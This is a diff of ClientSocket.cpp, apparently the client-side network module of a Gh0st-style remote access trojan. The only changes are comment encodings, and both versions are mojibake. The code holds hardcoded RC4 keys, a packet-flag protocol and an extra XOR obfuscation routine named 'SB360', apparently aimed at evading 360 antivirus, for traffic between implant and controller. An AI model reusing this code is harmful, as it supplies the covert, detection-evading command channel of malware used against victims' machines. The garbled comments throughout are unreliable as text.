@@ -1,4 +1,4 @@
-ï»¿// ClientSocket.cpp: implementation of the CClientSocket class.
+// ClientSocket.cpp: implementation of the CClientSocket class.
 //
 //////////////////////////////////////////////////////////////////////
 #include "StdAfx.h"
@@ -10,8 +10,8 @@
 #include "common/until.h"
 #pragma comment(lib, "ws2_32.lib")
 unsigned char CClientSocket::m_strkey[256] = {0};
-#define ZLIB_NO  1122111		//æ•°æ®åŒ…æ— åŽ‹ç¼©æ¨¡å¼
-#define ZLIB_OK  1122112		//æ•°æ®åŒ…ä¸ºåŽ‹ç¼©æ¨¡å¼
+#define ZLIB_NO  1122111		//Êý¾Ý°üÎÞÑ¹ËõÄ£Ê½
+#define ZLIB_OK  1122112		//Êý¾Ý°üÎªÑ¹ËõÄ£Ê½
 //////////////////////////////////////////////////////////////////////
 // Construction/Destruction
 //////////////////////////////////////////////////////////////////////
@@ -52,10 +52,10 @@ void rc4_crypt(unsigned char *s, unsigned char *Data, unsigned long Len)
 
 VOID MyEncryptFunction(LPSTR szData,WORD Size)
 {
-	//RC4 åŠ å¯† å¯†ç   Mother360
+	//RC4 ¼ÓÃÜ ÃÜÂë  Mother360
 	unsigned char m_strkey0[256];
 	char bpackey_se[] = {'A','C','K','Y','Z','Q','H','9','1','\0'};
-	rc4_init(m_strkey0,(unsigned char*)bpackey_se, sizeof(bpackey_se));  //åˆå§‹åŒ– RC4å¯†ç 
+	rc4_init(m_strkey0,(unsigned char*)bpackey_se, sizeof(bpackey_se));  //³õÊ¼»¯ RC4ÃÜÂë
 	
 	rc4_crypt(m_strkey0,(unsigned char *)szData,Size);
 	
@@ -71,12 +71,12 @@ CClientSocket::CClientSocket()
 	BYTE bPacketFlag[] = {'A*s%', 'n*q^', ' '};
 	memcpy(m_bPacketFlag, bPacketFlag, sizeof(bPacketFlag));
 	char abAQd[] = {'E','w','i','n','h','P','r','o','t','o','c','o','l','H','o','s','t','y','\0'};
-	rc4_init(m_strkey,(unsigned char*)abAQd, strlen(abAQd));  //åˆå§‹åŒ– RC4å¯†ç 
+	rc4_init(m_strkey,(unsigned char*)abAQd, strlen(abAQd));  //³õÊ¼»¯ RC4ÃÜÂë
 
 
 }
 
-// RC4 åˆå§‹åŒ–
+// RC4 ³õÊ¼»¯
 void CClientSocket::rc4_init(unsigned char *s, unsigned char *key, unsigned long Len)
 {
 	int i =0, j = 0, k[256] = {0};
@@ -90,12 +90,12 @@ void CClientSocket::rc4_init(unsigned char *s, unsigned char *key, unsigned long
 	{
 		j=(j+s[i]+k[i])%256;
 		tmp = s[i];
-		s[i] = s[j];     //äº¤æ¢s[i]å’Œs[j]
+		s[i] = s[j];     //½»»»s[i]ºÍs[j]
 		s[j] = tmp;
 	}
 }
 
-// RC4 åŠ å¯†è§£å¯†å‡½æ•°
+// RC4 ¼ÓÃÜ½âÃÜº¯Êý
 void CClientSocket::rc4_crypt(unsigned char *s, unsigned char *Data, unsigned long Len)
 {
 	int x = 0, y = 0, t = 0;
@@ -106,7 +106,7 @@ void CClientSocket::rc4_crypt(unsigned char *s, unsigned char *Data, unsigned lo
 		x=(x+1)%256;
 		y=(y+s[x])%256;
 		tmp = s[x];
-		s[x] = s[y];     //äº¤æ¢s[x]å’Œs[y]
+		s[x] = s[y];     //½»»»s[x]ºÍs[y]
 		s[y] = tmp;
 		t=(s[x]+s[y])%256;
 		Data[i] ^= s[t];
@@ -130,9 +130,9 @@ CClientSocket::~CClientSocket()
 
 bool CClientSocket::Connect(LPCTSTR lpszHost, UINT nPort)
 {
-	// ä¸€å®šè¦æ¸…é™¤ä¸€ä¸‹ï¼Œä¸ç„¶socketä¼šè€—å°½ç³»ç»Ÿèµ„æº
+	// Ò»¶¨ÒªÇå³ýÒ»ÏÂ£¬²»È»socket»áºÄ¾¡ÏµÍ³×ÊÔ´
 	Disconnect();
-	// é‡ç½®äº‹ä»¶å¯¹åƒ
+	// ÖØÖÃÊÂ¼þ¶ÔÏñ
 	ResetEvent(m_hEvent);
 	m_bIsRunning = false;
 	
@@ -148,7 +148,7 @@ bool CClientSocket::Connect(LPCTSTR lpszHost, UINT nPort)
 	if (pHostent == NULL)
 		return false;
 	
-	// æž„é€ sockaddr_inç»“æž„
+	// ¹¹Ôìsockaddr_in½á¹¹
 	sockaddr_in	ClientAddr;
 	ClientAddr.sin_family	= AF_INET;
 	
@@ -161,14 +161,14 @@ bool CClientSocket::Connect(LPCTSTR lpszHost, UINT nPort)
 	
     BOOL   bConditionalAccept=TRUE;   
 	DWORD  dwBytes;
-	// Set KeepAlive å¼€å¯ä¿æ´»æœºåˆ¶, é˜²æ­¢æœåŠ¡ç«¯äº§ç”Ÿæ­»è¿žæŽ¥
+	// Set KeepAlive ¿ªÆô±£»î»úÖÆ, ·ÀÖ¹·þÎñ¶Ë²úÉúËÀÁ¬½Ó
 	if (setsockopt(m_Socket, SOL_SOCKET, SO_KEEPALIVE, (const   char*)&bConditionalAccept, sizeof(BOOL)) == 0)
 	{
-		// è®¾ç½®è¶…æ—¶è¯¦ç»†ä¿¡æ¯
+		// ÉèÖÃ³¬Ê±ÏêÏ¸ÐÅÏ¢
 		tcp_keepalive	klive;
-		klive.onoff = 1; // å¯ç”¨ä¿æ´»
-		klive.keepalivetime = 1000 * 60 * 3; // 3åˆ†é’Ÿè¶…æ—¶ Keep Alive
-		klive.keepaliveinterval = 1000 * 5; // é‡è¯•é—´éš”ä¸º5ç§’ Resend if No-Reply
+		klive.onoff = 1; // ÆôÓÃ±£»î
+		klive.keepalivetime = 1000 * 60 * 3; // 3·ÖÖÓ³¬Ê± Keep Alive
+		klive.keepaliveinterval = 1000 * 5; // ÖØÊÔ¼ä¸ôÎª5Ãë Resend if No-Reply
 		WSAIoctl(m_Socket, 	SIO_KEEPALIVE_VALS,	&klive,	sizeof(tcp_keepalive),	NULL,	0,	&dwBytes,	0,	NULL);
 	}
 	
@@ -248,7 +248,7 @@ void CClientSocket::OnRead( LPBYTE lpBuffer, DWORD dwIoSize )
 	{
 		if (dwIoSize == FLAG_SIZE && memcmp(lpBuffer, m_bPacketFlag, FLAG_SIZE) == 0)
 		{
-			// é‡æ–°å‘é€	
+			// ÖØÐÂ·¢ËÍ	
 			Send(m_ResendWriteBuffer.GetBuffer(), m_ResendWriteBuffer.GetBufferLen());
 			return;
 		}
@@ -293,7 +293,7 @@ void CClientSocket::OnRead( LPBYTE lpBuffer, DWORD dwIoSize )
 
 				unsigned char Sbox[256] = {0};
 				memcpy( Sbox, m_strkey,sizeof(m_strkey));
-				rc4_crypt(Sbox,(unsigned char *)pData,nCompressLength);//RC4è§£å¯†è¯»å–
+				rc4_crypt(Sbox,(unsigned char *)pData,nCompressLength);//RC4½âÃÜ¶ÁÈ¡
 				SB360(pData, nCompressLength); //jiemi
 
 
@@ -301,7 +301,7 @@ void CClientSocket::OnRead( LPBYTE lpBuffer, DWORD dwIoSize )
 
 
 
-				if(nSomp == ZLIB_NO)  //åªæŽ¥æ”¶æ²¡åŽ‹ç¼©æ•°æ®
+				if(nSomp == ZLIB_NO)  //Ö»½ÓÊÕÃ»Ñ¹ËõÊý¾Ý
 				{
 					m_DeCompressionBuffer.ClearBuffer();
 					m_DeCompressionBuffer.Write(pData, nCompressLength);
@@ -342,9 +342,9 @@ void CClientSocket::Disconnect()
 	
 	m_Socket = INVALID_SOCKET;
 }
-void CClientSocket::SB360(LPBYTE szData, unsigned long Size)//åŠ å¯†å°åŒ…ç±»æˆå‘˜
+void CClientSocket::SB360(LPBYTE szData, unsigned long Size)//¼ÓÃÜ·â°üÀà³ÉÔ±
 {
-	//è¯¥æ•°ç»„ç”¨æ¥å¼‚æˆ–
+	//¸ÃÊý×éÓÃÀ´Òì»ò
 	WORD AddTable[] = {
 		3,5,8,2,9,7,4,0,3,9,2,9,1,5
 	};
@@ -385,7 +385,7 @@ int CClientSocket::Send( LPBYTE lpData, UINT nSize )
 		SB360(pDest,destLen); //jiami
 		unsigned char Sbox[256] = {0};
 		memcpy( Sbox, m_strkey,sizeof(m_strkey));
-		rc4_crypt(Sbox,(unsigned char *)pDest,destLen);//RC4åŠ å¯†å‘é€
+		rc4_crypt(Sbox,(unsigned char *)pDest,destLen);//RC4¼ÓÃÜ·¢ËÍ
 		//////////////////////////////////////////////////////////////////////////
 		LONG nBufLen = destLen + HDR_SIZE;
 		// 5 bytes packet flag
@@ -394,7 +394,7 @@ int CClientSocket::Send( LPBYTE lpData, UINT nSize )
 		m_WriteBuffer.Write((PBYTE) &nBufLen, sizeof(nBufLen));
 		// 4 byte header [Size of UnCompress Entire Packet]
 		m_WriteBuffer.Write((PBYTE) &nSize, sizeof(nSize));
-		//å†™å…¥æ•°æ®åŽ‹ç¼©æ ‡å¿—  4 bytes
+		//Ð´ÈëÊý¾ÝÑ¹Ëõ±êÖ¾  4 bytes
 		BOOL bZlib = ZLIB_OK;
 		m_WriteBuffer.Write((PBYTE) &bZlib, sizeof(BOOL));        
 		// Write Data
@@ -402,22 +402,22 @@ int CClientSocket::Send( LPBYTE lpData, UINT nSize )
 		
 		delete [] pDest;
 		
-		// å‘é€å®ŒåŽï¼Œå†å¤‡ä»½æ•°æ®, å› ä¸ºæœ‰å¯èƒ½æ˜¯m_ResendWriteBufferæœ¬èº«åœ¨å‘é€,æ‰€ä»¥ä¸ç›´æŽ¥å†™å…¥
+		// ·¢ËÍÍêºó£¬ÔÙ±¸·ÝÊý¾Ý, ÒòÎªÓÐ¿ÉÄÜÊÇm_ResendWriteBuffer±¾ÉíÔÚ·¢ËÍ,ËùÒÔ²»Ö±½ÓÐ´Èë
 		LPBYTE lpResendWriteBuffer = new BYTE[nSize];
 		CopyMemory(lpResendWriteBuffer, lpData, nSize);
 		m_ResendWriteBuffer.ClearBuffer();
-		m_ResendWriteBuffer.Write(lpResendWriteBuffer, nSize);	// å¤‡ä»½å‘é€çš„æ•°æ®
+		m_ResendWriteBuffer.Write(lpResendWriteBuffer, nSize);	// ±¸·Ý·¢ËÍµÄÊý¾Ý
 		if (lpResendWriteBuffer)
 			delete [] lpResendWriteBuffer;
 	}
-	else // è¦æ±‚é‡å‘, åªå‘é€FLAG
+	else // ÒªÇóÖØ·¢, Ö»·¢ËÍFLAG
 	{
 		m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
 		m_ResendWriteBuffer.ClearBuffer();
-		m_ResendWriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));	// å¤‡ä»½å‘é€çš„æ•°æ®	
+		m_ResendWriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));	// ±¸·Ý·¢ËÍµÄÊý¾Ý	
 	}
 	
-	// åˆ†å—å‘é€
+	// ·Ö¿é·¢ËÍ
 	return SendWithSplit(m_WriteBuffer.GetBuffer(), m_WriteBuffer.GetBufferLen(), MAX_SEND_BUFFER);
 }
 
@@ -440,7 +440,7 @@ int CClientSocket::SendWithSplit(LPBYTE lpData, UINT nSize, UINT nSplitSize)
 	int			size = 0;
 	int			nSend = 0;
 	int			nSendRetry = 15;
-	// ä¾æ¬¡å‘é€
+	// ÒÀ´Î·¢ËÍ
 	for (size = nSize; size >= nSplitSize; size -= nSplitSize)
 	{
 		for (int i = 0; i < nSendRetry; i++)
@@ -454,10 +454,10 @@ int CClientSocket::SendWithSplit(LPBYTE lpData, UINT nSize, UINT nSplitSize)
 		
 		nSend += nRet;
 		pbuf += nSplitSize;
-		Sleep(10); // å¿…è¦çš„Sleep,è¿‡å¿«ä¼šå¼•èµ·æŽ§åˆ¶ç«¯æ•°æ®æ··ä¹±
+		Sleep(10); // ±ØÒªµÄSleep,¹ý¿ì»áÒýÆð¿ØÖÆ¶ËÊý¾Ý»ìÂÒ
 	}
 	
-	// å‘é€æœ€åŽçš„éƒ¨åˆ†
+	// ·¢ËÍ×îºóµÄ²¿·Ö
 	if (size > 0)
 	{
 		for (int i = 0; i < nSendRetry; i++)
